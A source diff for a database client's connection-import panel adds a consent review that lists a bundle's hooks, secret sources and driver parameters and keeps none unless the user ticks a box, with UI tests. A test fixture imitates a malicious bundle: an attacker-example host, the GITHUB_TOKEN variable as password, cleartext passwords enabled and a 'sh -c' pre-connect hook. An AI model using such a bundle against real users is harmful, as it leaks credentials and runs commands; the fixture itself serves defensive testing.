@@ -19,13 +19,15 @@ use dbflux_portability::external::{
     importers,
 };
 use dbflux_portability::{
-    ConflictChoice, ImportPlan, ParsedBundle, RequiredResolutionKind, ResolutionChoices,
+    ConflictChoice, ConnectionReview, ImportConsent, ImportPlan, ImportReview, ParsedBundle,
+    RequiredResolutionKind, ResolutionChoices,
 };
 use dbflux_ui_base::AppStateEntity;
 use dbflux_ui_base::user_error::{ErrorKind, UserFacingError, report_error};
 use gpui::prelude::*;
 use gpui::*;
 use gpui_component::ActiveTheme;
+use gpui_component::scroll::Scrollbar;
 use uuid::Uuid;
 
 /// Event emitted by [`ImportConnectionsPanel`] so the connection manager can
@@ -219,6 +221,13 @@ pub struct ImportConnectionsPanel {
     import_plan: Option<ImportPlan>,
     confirm_summary: Option<ConfirmSummary>,
 
+    // Hooks, value sources and driver parameters of the loaded bundle, and
+    // which of them the user ticked to keep. Consent belongs to one bundle:
+    // loading another one clears it.
+    import_review: Option<ImportReview>,
+    consent: ImportConsent,
+    review_scroll: ScrollHandle,
+
     // Conflict resolution choices, keyed by `bundle_local_id`.
     conflict_choices: HashMap<String, ConflictChoice>,
 
@@ -303,6 +312,9 @@ impl ImportConnectionsPanel {
             parsed_bundle: None,
             import_plan: None,
             confirm_summary: None,
+            import_review: None,
+            consent: ImportConsent::default(),
+            review_scroll: ScrollHandle::new(),
             conflict_choices: HashMap::new(),
             secret_inputs: HashMap::new(),
             secret_values: HashMap::new(),
@@ -340,6 +352,8 @@ impl ImportConnectionsPanel {
         self.parsed_bundle = None;
         self.import_plan = None;
         self.confirm_summary = None;
+        self.import_review = None;
+        self.consent = ImportConsent::default();
         self.conflict_choices.clear();
         self.secret_inputs.clear();
         self.secret_values.clear();
@@ -808,6 +822,9 @@ impl ImportConnectionsPanel {
                                 .collect::<std::collections::HashSet<_>>();
                             this.confirm_summary =
                                 Some(confirm_summary(&parsed, &plan, &registered));
+                            this.import_review = Some(dbflux_portability::consent::review(&parsed));
+                            this.consent = ImportConsent::default();
+                            this.review_scroll.set_offset(Point::default());
 
                             this.parsed_bundle = Some(parsed);
                             this.import_plan = Some(plan);
@@ -933,6 +950,7 @@ impl ImportConnectionsPanel {
             conflict_choices: self.conflict_choices.clone(),
             secret_values,
             auth_profile_choices: self.auth_profile_choices.clone(),
+            consent: self.consent,
         }
     }
 
@@ -1074,6 +1092,14 @@ impl Render for ImportConnectionsPanel {
                 }
             })
             .confirm_enabled(self.can_advance(cx));
+
+        // The review list on the preview step can be longer than its box;
+        // the arrow and page keys scroll it.
+        let shell = if self.step == Step::Preview {
+            shell.scroll_with_keys(&self.review_scroll)
+        } else {
+            shell
+        };
 
         // A running load or import cannot be cancelled, so the shell draws no
         // close button and ignores Escape and backdrop clicks until it ends.
@@ -1545,17 +1571,191 @@ impl ImportConnectionsPanel {
             ));
         }
 
-        col = col.child(
-            BannerBlock::new(
-                BannerVariant::Info,
-                dbflux_i18n::t!("connection_manager.import.hint.external_refs"),
-            )
-            .with_body(dbflux_i18n::t!(
-                "connection_manager.import.hint.external_refs_body"
-            )),
-        );
+        if let Some(review) = self.import_review.as_ref().filter(|r| !r.is_empty()) {
+            col = col.child(self.render_review(review, cx));
+        }
 
         col.into_any_element()
+    }
+
+    /// Lists every hook, value source and driver parameter the bundle sets,
+    /// then asks for consent to keep the hooks and the highlighted entries.
+    /// The list scrolls on its own so the checkboxes stay in view.
+    fn render_review(&self, review: &ImportReview, cx: &Context<Self>) -> AnyElement {
+        let theme = cx.theme().clone();
+
+        let mut list = div().flex().flex_col().gap(Spacing::SM);
+        for connection in &review.connections {
+            list = list.child(Self::render_review_connection(connection, cx));
+        }
+
+        let scroll = div()
+            .relative()
+            .max_h(px(260.0))
+            .flex()
+            .flex_col()
+            .child(
+                div()
+                    .id("import-review-list")
+                    .min_h_0()
+                    .flex()
+                    .flex_col()
+                    .overflow_y_scroll()
+                    .track_scroll(&self.review_scroll)
+                    .child(div().flex_none().child(list)),
+            )
+            .child(
+                div()
+                    .absolute()
+                    .inset_0()
+                    .child(Scrollbar::vertical(&self.review_scroll)),
+            );
+
+        let mut col = div()
+            .flex()
+            .flex_col()
+            .gap(Spacing::SM)
+            .child(
+                Text::body(dbflux_i18n::t!("connection_manager.import.review.intro"))
+                    .color(theme.muted_foreground),
+            )
+            .child(scroll);
+
+        if review.has_hooks() {
+            let checked = self.consent.hooks;
+            col = col.child(
+                BannerBlock::new(
+                    BannerVariant::Danger,
+                    dbflux_i18n::t!("connection_manager.import.consent.hooks_title"),
+                )
+                .with_body(dbflux_i18n::t!(
+                    "connection_manager.import.consent.hooks_body"
+                ))
+                .with_actions(Self::consent_checkbox(
+                    "import-consent-hooks",
+                    dbflux_i18n::t!("connection_manager.import.consent.hooks_checkbox"),
+                    checked,
+                    |consent| &mut consent.hooks,
+                    cx,
+                )),
+            );
+        }
+
+        if review.has_external_values() {
+            let checked = self.consent.external_values;
+            col = col.child(
+                BannerBlock::new(
+                    BannerVariant::Warning,
+                    dbflux_i18n::t!("connection_manager.import.consent.values_title"),
+                )
+                .with_body(dbflux_i18n::t!(
+                    "connection_manager.import.consent.values_body"
+                ))
+                .with_actions(Self::consent_checkbox(
+                    "import-consent-values",
+                    dbflux_i18n::t!("connection_manager.import.consent.values_checkbox"),
+                    checked,
+                    |consent| &mut consent.external_values,
+                    cx,
+                )),
+            );
+        }
+
+        col.into_any_element()
+    }
+
+    fn consent_checkbox(
+        id: &'static str,
+        label: String,
+        checked: bool,
+        field: fn(&mut ImportConsent) -> &mut bool,
+        cx: &Context<Self>,
+    ) -> impl IntoElement {
+        Checkbox::new(id)
+            .checked(checked)
+            .label(label)
+            .on_click(cx.listener(move |this, checked: &bool, _, cx| {
+                *field(&mut this.consent) = *checked;
+                cx.notify();
+            }))
+    }
+
+    fn render_review_connection(connection: &ConnectionReview, cx: &Context<Self>) -> AnyElement {
+        let theme = cx.theme().clone();
+
+        let section = |title: String| {
+            Text::caption(title)
+                .font_size(FontSizes::XS)
+                .color(theme.muted_foreground)
+        };
+
+        let mut block = surface(SurfaceRole::Raised, cx)
+            .w_full()
+            .px(Spacing::SM)
+            .py(Spacing::XS)
+            .flex()
+            .flex_col()
+            .gap(Spacing::XS)
+            .child(
+                div()
+                    .text_size(FontSizes::SM)
+                    .text_color(theme.foreground)
+                    .child(crate::labels::import_review_connection(connection)),
+            );
+
+        if !connection.hooks.is_empty() {
+            block = block.child(section(dbflux_i18n::t!(
+                "connection_manager.import.review.hooks"
+            )));
+            for hook in &connection.hooks {
+                let mut entry =
+                    div().flex().flex_col().pl(Spacing::SM).child(
+                        Text::body_sm(crate::labels::import_review_hook_title(hook)).danger(),
+                    );
+                if let Some(line) = &hook.command_line {
+                    entry = entry.child(Text::code(line.clone()));
+                }
+                if let Some(excerpt) = &hook.excerpt {
+                    entry = entry.child(Text::code(excerpt.clone()));
+                }
+                for note in crate::labels::import_review_hook_notes(hook) {
+                    entry = entry.child(Text::caption(note).font_size(FontSizes::XS));
+                }
+                block = block.child(entry);
+            }
+        }
+
+        if !connection.value_refs.is_empty() {
+            block = block.child(section(dbflux_i18n::t!(
+                "connection_manager.import.review.value_sources"
+            )));
+            for value_ref in &connection.value_refs {
+                let line = Text::body_sm(crate::labels::import_review_value_ref(value_ref));
+                let line = if value_ref.needs_consent() {
+                    line.warning()
+                } else {
+                    line
+                };
+                block = block.child(div().pl(Spacing::SM).child(line));
+            }
+        }
+
+        if !connection.driver_params.is_empty() {
+            block = block.child(section(dbflux_i18n::t!(
+                "connection_manager.import.review.driver_params"
+            )));
+            for param in &connection.driver_params {
+                let line = Text::body_sm(crate::labels::import_review_driver_param(param));
+                let line = if param.needs_consent {
+                    line.warning()
+                } else {
+                    line
+                };
+                block = block.child(div().pl(Spacing::SM).child(line));
+            }
+        }
+
+        block.into_any_element()
     }
 
     fn render_conflicts(&self, cx: &Context<Self>) -> AnyElement {
@@ -1928,6 +2128,22 @@ impl ImportConnectionsPanel {
                         ),
                     ));
                 }
+
+                if !outcome.withheld.is_empty() {
+                    let body = outcome
+                        .withheld
+                        .iter()
+                        .map(crate::labels::import_outcome_withheld_line)
+                        .collect::<Vec<_>>()
+                        .join("\n");
+                    col = col.child(
+                        BannerBlock::new(
+                            BannerVariant::Info,
+                            crate::labels::import_outcome_withheld(outcome.withheld.len()),
+                        )
+                        .with_body(body),
+                    );
+                }
             }
             Some(ImportRunResult::External(outcome)) => {
                 if !outcome.succeeded.is_empty() {
@@ -2164,8 +2380,6 @@ mod tests {
         "connection_manager.import.field.show_passphrase",
         "connection_manager.import.field.hide_passphrase",
         "connection_manager.import.hint.no_native_picker",
-        "connection_manager.import.hint.external_refs",
-        "connection_manager.import.hint.external_refs_body",
         "connection_manager.import.hint.leave_empty_skip",
         "connection_manager.import.hint.select_profile_or_skip",
         "connection_manager.import.modal_title",
@@ -2210,6 +2424,37 @@ mod tests {
         "connection_manager.import.outcome.unresolved_refs.many",
         "connection_manager.import.outcome.secret_failures.one",
         "connection_manager.import.outcome.secret_failures.many",
+        "connection_manager.import.review.intro",
+        "connection_manager.import.review.connection",
+        "connection_manager.import.review.hooks",
+        "connection_manager.import.review.value_sources",
+        "connection_manager.import.review.driver_params",
+        "connection_manager.import.review.hook_kind.command",
+        "connection_manager.import.review.hook_kind.script",
+        "connection_manager.import.review.hook_kind.lua",
+        "connection_manager.import.review.hook_disabled",
+        "connection_manager.import.review.hook_cwd",
+        "connection_manager.import.review.hook_env",
+        "connection_manager.import.review.lua_process_run",
+        "connection_manager.import.review.lua_env_read",
+        "connection_manager.import.review.value_literal",
+        "connection_manager.import.review.value_source",
+        "connection_manager.import.review.param",
+        "connection_manager.import.review.param_flagged",
+        "connection_manager.import.consent.hooks_title",
+        "connection_manager.import.consent.hooks_body",
+        "connection_manager.import.consent.hooks_checkbox",
+        "connection_manager.import.consent.values_title",
+        "connection_manager.import.consent.values_body",
+        "connection_manager.import.consent.values_checkbox",
+        "connection_manager.import.outcome.withheld.one",
+        "connection_manager.import.outcome.withheld.many",
+        "connection_manager.import.outcome.withheld_hooks.one",
+        "connection_manager.import.outcome.withheld_hooks.many",
+        "connection_manager.import.outcome.withheld_value_refs.one",
+        "connection_manager.import.outcome.withheld_value_refs.many",
+        "connection_manager.import.outcome.withheld_driver_params.one",
+        "connection_manager.import.outcome.withheld_driver_params.many",
         "connection_manager.import.action.reuse_existing",
         "connection_manager.import.action.create_new",
         "connection_manager.import.action.map_to",
@@ -2263,7 +2508,18 @@ mod tests {
     fn import_panel_keys_diverge_between_locales() {
         // "Proxy" is a proper noun kept identical in both locales, matching the
         // convention already used for other proxy-facing keys in this catalog.
-        const UNTRANSLATED: &[&str] = &["connection_manager.import.conflict_kind.proxy"];
+        // The review's connection heading and `key = value` / `field: source`
+        // lines are only placeholders and punctuation, and "hook" is the term
+        // the Spanish catalog already uses.
+        const UNTRANSLATED: &[&str] = &[
+            "connection_manager.import.conflict_kind.proxy",
+            "connection_manager.import.review.connection",
+            "connection_manager.import.review.hooks",
+            "connection_manager.import.review.value_source",
+            "connection_manager.import.review.param",
+            "connection_manager.import.outcome.withheld_hooks.one",
+            "connection_manager.import.outcome.withheld_hooks.many",
+        ];
 
         for key in IMPORT_PANEL_KEYS {
             if UNTRANSLATED.contains(key) {
@@ -2437,5 +2693,246 @@ mod keyboard_tests {
         click_backdrop(window);
 
         assert!(events.borrow().is_empty());
+    }
+
+    /// A hand-written bundle: a MySQL connection with a hook, a value source
+    /// that reads a local secret, a parameter that enables cleartext
+    /// passwords and a harmless one.
+    const CRAFTED_BUNDLE: &str = r#"
+[bundle]
+format_version = 1
+created_at = "2026-10-31T00:00:00Z"
+dbflux_version = "0.9.0"
+encryption = "none"
+
+[[connections]]
+local_id = "c1"
+name = "Crafted import"
+driver_id = "mysql"
+kind = "MySQL"
+include_hooks = true
+driver_params = [
+    { key = "compress", value = "true" },
+    { key = "enable_cleartext_plugin", value = "true" },
+]
+
+[connections.fields]
+host = "db.attacker.example"
+port = "3306"
+user = "admin"
+
+[connections.value_refs.password]
+source = "env"
+key = "GITHUB_TOKEN"
+
+[[connections.hooks_payload.pre_connect]]
+kind = "command"
+command = "sh"
+args = ["-c", "id"]
+"#;
+
+    /// Loads the crafted bundle from a file and imports it with Enter, as a
+    /// user would, setting `consent` on the preview step first. Returns the
+    /// imported profile.
+    /// Loads the crafted bundle from a file with Enter, as a user would, and
+    /// checks the preview lists it with nothing consented to yet.
+    fn load_bundle(panel: &Entity<ImportConnectionsPanel>, window: &mut VisualTestContext) {
+        let path = std::env::temp_dir().join(format!(
+            "dbflux-import-consent-{}.toml",
+            uuid::Uuid::new_v4()
+        ));
+        std::fs::write(&path, CRAFTED_BUNDLE).expect("write bundle");
+
+        window.update(|window, cx| {
+            let input = panel.read(cx).file_input.clone();
+            input.update(cx, |state, cx| {
+                state.set_value(path.display().to_string(), window, cx)
+            });
+        });
+        window.run_until_parked();
+        window.simulate_keystrokes("enter");
+        window.run_until_parked();
+        std::fs::remove_file(&path).ok();
+
+        let (step, has_hooks, has_values, default_consent) = window.update(|_, cx| {
+            let panel = panel.read(cx);
+            let review = panel.import_review.clone().unwrap_or_default();
+            (
+                panel.step,
+                review.has_hooks(),
+                review.has_external_values(),
+                panel.consent,
+            )
+        });
+        assert_eq!(step, Step::Preview);
+        assert!(
+            has_hooks && has_values,
+            "the preview lists the hook and values"
+        );
+        assert_eq!(
+            default_consent,
+            dbflux_portability::ImportConsent::default(),
+            "nothing is consented to before the user ticks a box"
+        );
+    }
+
+    /// A finished import announces itself with a toast.
+    fn install_toasts(cx: &mut TestAppContext) {
+        cx.update(|cx| {
+            let host = cx.new(|_| dbflux_ui_base::toast::ToastHost::new());
+            cx.set_global(dbflux_ui_base::toast::ToastGlobal { host });
+        });
+    }
+
+    fn load_crafted_bundle(
+        cx: &mut TestAppContext,
+    ) -> (Entity<ImportConnectionsPanel>, &mut VisualTestContext) {
+        install_toasts(cx);
+        let (panel, _outside, window, _events) = open_panel(cx);
+        load_bundle(&panel, window);
+        (panel, window)
+    }
+
+    /// Shows the panel under the component `Root`, which answers Tab the way
+    /// the app's windows do.
+    fn open_panel_under_root(
+        cx: &mut TestAppContext,
+    ) -> (Entity<ImportConnectionsPanel>, &mut VisualTestContext) {
+        cx.update(gpui_component::init);
+        cx.update(dbflux_components::theme::init);
+        cx.update(dbflux_ui_base::keymap::init_keymap);
+        install_toasts(cx);
+        let app_state = cx.new(|_| {
+            AppStateEntity::new_with_storage_runtime(
+                StorageRuntime::in_memory().expect("in-memory storage"),
+            )
+            .expect("app state")
+        });
+
+        let slot: Rc<RefCell<Option<Entity<ImportConnectionsPanel>>>> = Rc::default();
+        let (_, window) = cx.add_window_view({
+            let slot = slot.clone();
+            move |window, cx| {
+                let panel = cx.new(|cx| ImportConnectionsPanel::new(app_state, window, cx));
+                slot.replace(Some(panel.clone()));
+                gpui_component::Root::new(panel, window, cx)
+            }
+        });
+        let panel = slot.borrow().clone().expect("panel");
+        window.update(|window, cx| panel.update(cx, |panel, cx| panel.reset(window, cx)));
+        window.run_until_parked();
+
+        (panel, window)
+    }
+
+    /// Imports the crafted bundle with `consent` set on the preview step and
+    /// returns the imported profile.
+    fn import_crafted_bundle(
+        cx: &mut TestAppContext,
+        consent: dbflux_portability::ImportConsent,
+    ) -> dbflux_core::ConnectionProfile {
+        let (panel, window) = load_crafted_bundle(cx);
+
+        update_panel(window, &panel, |panel| panel.consent = consent);
+        window.simulate_keystrokes("enter");
+        window.run_until_parked();
+
+        window.update(|_, cx| {
+            let panel = panel.read(cx);
+            assert_eq!(panel.step, Step::Outcome);
+            panel
+                .app_state
+                .read(cx)
+                .profiles()
+                .iter()
+                .find(|profile| profile.name == "Crafted import")
+                .cloned()
+                .expect("the connection was imported")
+        })
+    }
+
+    #[gpui::test]
+    fn the_import_panel_imports_no_hooks_or_secrets_unless_ticked(cx: &mut TestAppContext) {
+        let profile = import_crafted_bundle(cx, dbflux_portability::ImportConsent::default());
+
+        assert!(profile.hooks.is_none());
+        assert!(profile.value_refs.is_empty());
+        assert_eq!(
+            profile.driver_params,
+            vec![dbflux_core::DriverParam::new("compress", "true")]
+        );
+    }
+
+    #[gpui::test]
+    fn the_import_panel_imports_what_the_user_ticked(cx: &mut TestAppContext) {
+        let profile = import_crafted_bundle(cx, dbflux_portability::ImportConsent::all());
+
+        assert!(profile.hooks.is_some());
+        assert!(profile.value_refs.contains_key("password"));
+        assert_eq!(profile.driver_params.len(), 2);
+    }
+
+    /// Presses and releases a key: `simulate_keystrokes` only sends the key
+    /// down, and GPUI turns the release of Enter or Space into the click.
+    fn press(window: &mut VisualTestContext, key: &str) {
+        let keystroke = gpui::Keystroke::parse(key).expect("valid keystroke");
+        window.simulate_event(gpui::KeyDownEvent {
+            keystroke: keystroke.clone(),
+            is_held: false,
+            prefer_character_input: false,
+        });
+        window.simulate_event(gpui::KeyUpEvent { keystroke });
+        window.run_until_parked();
+    }
+
+    #[gpui::test]
+    fn the_consent_boxes_tick_from_the_keyboard_without_importing(cx: &mut TestAppContext) {
+        let (panel, window) = open_panel_under_root(cx);
+        load_bundle(&panel, window);
+        let state = |window: &mut VisualTestContext| {
+            window.update(|_, cx| {
+                let panel = panel.read(cx);
+                (panel.step, panel.consent)
+            })
+        };
+
+        // The close button comes first, then the two boxes.
+        window.simulate_keystrokes("tab tab");
+        press(window, "enter");
+        let (step, consent) = state(window);
+        assert_eq!(
+            step,
+            Step::Preview,
+            "Enter on a box must not start the import"
+        );
+        assert!(consent.hooks && !consent.external_values);
+
+        window.simulate_keystrokes("tab");
+        press(window, "space");
+        let (step, consent) = state(window);
+        assert_eq!(step, Step::Preview);
+        assert!(consent.hooks && consent.external_values);
+
+        window.simulate_keystrokes("shift-tab");
+        press(window, "enter");
+        let (step, consent) = state(window);
+        assert_eq!(step, Step::Preview);
+        assert!(
+            !consent.hooks && consent.external_values,
+            "Enter unticks too"
+        );
+    }
+
+    #[gpui::test]
+    fn consent_does_not_survive_a_reset(cx: &mut TestAppContext) {
+        let (panel, _outside, window, _events) = open_panel(cx);
+        update_panel(window, &panel, |panel| {
+            panel.consent = dbflux_portability::ImportConsent::all();
+        });
+
+        window.update(|window, cx| panel.update(cx, |panel, cx| panel.reset(window, cx)));
+
+        let consent = window.update(|_, cx| panel.read(cx).build_resolution_choices().consent);
+        assert_eq!(consent, dbflux_portability::ImportConsent::default());
     }
 }
